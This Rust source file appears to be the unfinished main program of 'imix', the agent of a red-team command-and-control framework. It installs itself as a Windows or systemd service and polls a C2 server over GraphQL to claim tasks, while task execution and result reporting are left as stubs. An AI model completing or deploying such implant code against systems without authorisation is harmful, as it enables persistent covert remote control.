extern crate imix;
extern crate eldritch;

use clap::{Command, arg};
pub use imix::graphql;
use imix::graphql::GraphQLTask;
use std::borrow::BorrowMut;
use std::collections::HashMap;
use std::fs::File;
use std::path::Path;

use anyhow::Error;
use tokio::task::JoinHandle;

enum TaskStatus {
    Running,
    Finished,
}

struct Task{
    status: TaskStatus, // Wating, Running, Finished
    graphql_task: GraphQLTask,
    future_handle: JoinHandle<Result<(String,String), Error>>, // Handle to the task
}

async fn install(config_path: String) -> Result<(), imix::Error> {
    let config_file = File::open(config_path)?;
    let config: imix::Config = serde_json::from_reader(config_file)?;

    #[cfg(target_os = "windows")]
    return imix::windows::install(config).await;
	
    #[cfg(target_os = "linux")]
    if Path::new(imix::linux::SYSTEMD_DIR).is_dir() {
        return imix::linux::install(config).await;
    }
	 
	unimplemented!("The current OS/Service Manager is not supported")
}

async fn execute_task(Task: GraphQLTask) -> Result<(String, String), Error> {
    Ok(("root".to_string(), "".to_string()))
}

fn queue_task(input_task: GraphQLTask) -> Task {
    let task_execute_future = execute_task(input_task.clone());
    let res = Task{
        status: TaskStatus::Running,
        graphql_task: input_task,
        future_handle: tokio::task::spawn(task_execute_future),
    };
    res
}

async fn main_loop(imix_config: imix::Config) {
    let debug = true;
    let mut active_tasks: HashMap<String,Task> = HashMap::new();
    loop {
        // 0. Get loop start time

        // 1. Pull down new tasks
        let new_tasks = match graphql::gql_claim_tasks(imix_config.callback_config.c2_configs[0].uri.clone()).await {
            Ok(tasks) => tasks,
            Err(error) => {
                if debug {
                    println!("main_loop: error claiming task\n{:?}", error)
                }
                continue;
            },
        };

        // 2. Start new tasks
        for task in new_tasks {
            match active_tasks.insert(task.id.clone(), queue_task(task)) {
                Some(old_task) => {
                    if debug {
                        println!("main_loop: error adding new task. Non-unique taskID\n{}", old_task.graphql_task.id)
                    }
                },
                None => {},
            }
        }    
        // 3. Sleep till callback time

        // 4. Collect task output
        for task in &active_tasks {
            
        }

        // 5. Send task output 

    }
    unimplemented!("Nothing here yet. ")
}

async fn run(config_path: String) -> Result<(), imix::Error> {
    let config_file = File::open(config_path)?;
    let config: imix::Config = serde_json::from_reader(config_file)?;

    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    unimplemented!("The current OS/Manager is not supported");

    Ok(main_loop(config).await)

}

#[tokio::main]
async fn main() -> Result<(), imix::Error> {
    let matches = Command::new("imix")
        .arg(
            arg!(
                -c --config <FILE> "Sets a custom config file"
            )
            .required(false)
        )
        .subcommand(
            Command::new("install")
                .about("Run in install mode")
                .arg(
                    arg!(
                        -c --config <FILE> "Sets a custom config file"
                    )
                    .required(true)
                )
        )
        .get_matches();
    
    if let Some(config_path) = matches.value_of("config") {
        return run(String::from(config_path)).await
    }

    match matches.subcommand() {
        Some(("install", args)) => {
            let config_path = args.value_of("config").unwrap();
            install(String::from(config_path)).await
        },
        _ => Ok(())
    }
}


